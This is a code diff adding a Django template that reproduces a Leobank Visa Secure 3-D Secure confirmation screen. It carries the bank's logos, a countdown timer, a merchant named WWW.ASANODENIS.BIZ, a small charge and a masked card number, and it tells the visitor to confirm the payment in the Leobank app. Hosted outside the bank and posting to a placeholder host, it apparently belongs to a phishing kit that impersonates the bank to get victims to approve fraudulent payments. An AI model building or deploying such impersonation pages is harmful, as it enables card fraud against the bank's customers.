@@ -1,0 +1,60 @@
+
+{% load static %}
+<html lang="EN" dir="ltr"><head>
+    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width, height=device-height">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <title>
+    </title>
+    <link rel="shortcut icon" type="image/ico" href="{% static 'img/leobank.png' %}">
+    <link rel="stylesheet" href="{% static 'css/leo.css' %}">
+    <link rel="stylesheet" href="{% static 'css/leo2.css' %}">
+    
+<style type="text/css">@font-face { font-family: Roboto; src: url("chrome-extension://mcgbeeipkmelnpldkobichboakdfaeon/css/Roboto-Regular.ttf"); }</style></head>
+<body class="VISA vsc-initialized" cz-shortcut-listen="true">
+<div data-entry-point="application-container"><div class="main web-based"><div class="header-zone"><button id="cancel" class="cancel">Cancel</button></div><div class="title"><div class="logo"><img src="{% static 'img/leobank.png' %}"></div><div class="ps"><img src="{% static 'img/leovisa.png' %}" alt="Visa Secure"></div></div><div class="content"><div class="form-for-submit"><div data-entry-point="authentication"><div class="item authentication-oob"><form class="cp-ExtAuthApp" action="https://emv3ds/challenge" id="oob-form" data-validation-context="*" novalidate=""><ul class="cp-error-descriptions" style="display: none;"></ul><div class="item data-label">To confirm the payment, open the Leobank application on your smartphone</div></form></div></div><div class="oob-timer-wrapper">
+<div class="oob-timer-container">
+<svg class="spinner" viewBox="0 0 50 50">
+<linearGradient id="grad"><stop class="stop stop--1" stop-color="#ffc88a" offset="0"></stop>
+<stop class="stop stop--2" stop-color="#ff8fec" offset="49%"></stop>
+<stop class="stop stop--2" stop-color="#ff8fec" offset="51%"></stop>
+<stop class="stop stop--3" stop-color="#85a5ff" offset="100%"></stop>
+</linearGradient>
+<circle class="path" cx="25" cy="25" r="20" fill="none" stroke="url(#grad)" stroke-width="5"></circle>
+</svg><div class="oob-timer">110</div>
+<script>
+    var countdown = setInterval(function(){
+      var elem = document.querySelector('.oob-timer');
+      var count = parseInt(elem.innerHTML);
+      count--;
+      elem.innerHTML = count;
+      if (count === 0){
+        clearInterval(countdown);
+       
+      }
+    }, 1000);
+  </script>
+  
+</div>
+</div></div><div data-entry-point="payment-details"><div><div class="item columns payment-info"><div class="item-left">WWW.ASANODENIS.BIZ</div><div class="item-right item-amount">1 <span>₼</span></div></div><div class="item columns"><div class="item-left">Date</div><div class="item-right">03.05.2023, 20:52:33 </div></div><div class="item columns"><div class="item-left">Card Number</div><div class="item-right">****4762 </div></div></div></div></div><div class="information-zone"><div><input class="hide" id="hd-1" type="checkbox"><label for="hd-1" class="cp-cursor-pointer">Need help?</label><div class="cp-help-text"><div class="cp-margin-bottom">Payment confirmation will be done using the mobile app.</div>Step 1<div class="cp-help-txt">Open the Leobank mobile application on your smartphone.</div>Step 2<div class="cp-help-txt">Click the Confirm to confirm the payment.</div></div></div></div></div></div>
+<div>
+    <div class="cp-ajax-indicator cp-not-displayed">
+        <div class="sk-circle">
+            <div class="sk-circle1 sk-child"></div>
+            <div class="sk-circle2 sk-child"></div>
+            <div class="sk-circle3 sk-child"></div>
+            <div class="sk-circle4 sk-child"></div>
+            <div class="sk-circle5 sk-child"></div>
+            <div class="sk-circle6 sk-child"></div>
+            <div class="sk-circle7 sk-child"></div>
+            <div class="sk-circle8 sk-child"></div>
+            <div class="sk-circle9 sk-child"></div>
+            <div class="sk-circle10 sk-child"></div>
+            <div class="sk-circle11 sk-child"></div>
+            <div class="sk-circle12 sk-child"></div>
+        </div>
+        <img src="/imh/leovisa.png">
+    </div>
+</div>
+<
+
+<daily-companion-app></daily-companion-app></body></html>
